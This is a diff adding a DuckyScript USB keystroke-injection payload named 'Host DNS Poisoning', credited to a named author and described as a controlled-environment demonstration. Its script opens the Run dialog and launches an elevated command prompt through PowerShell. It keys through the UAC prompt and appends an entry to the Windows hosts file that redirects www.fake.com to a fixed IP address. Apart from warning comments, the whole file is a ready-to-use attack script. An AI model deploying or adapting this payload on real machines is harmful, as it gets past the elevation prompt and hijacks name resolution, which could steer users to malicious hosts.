@@ -1,0 +1,18 @@
+REM === Payload Title: Host DNS Poisoning ===
+REM Author: Shad Bin Mohd Rizal
+REM Created: 18-10-2025
+REM Purpose: Demonstration of hosts-file override / DNS poisoning effects in a controlled environment
+REM Target: Windows environment 
+REM Notes:
+REM - Do not deploy on production networks, public Internet, or any systems you do not own or have explicit written permission to test                                                  
+REM - Testing against third‑party domains or redirecting live users may be unlawful and cause harm                                              
+
+GUI R
+DELAY 400
+STRING powershell -Command "Start-Process cmd -Verb runAs -ArgumentList '/c echo 101.99.74.214    www.fake.com >> C:\Windows\System32\drivers\etc\hosts'"
+DELAY 400
+ENTER
+DELAY 400
+LEFTARROW
+DELAY 400
+ENTER
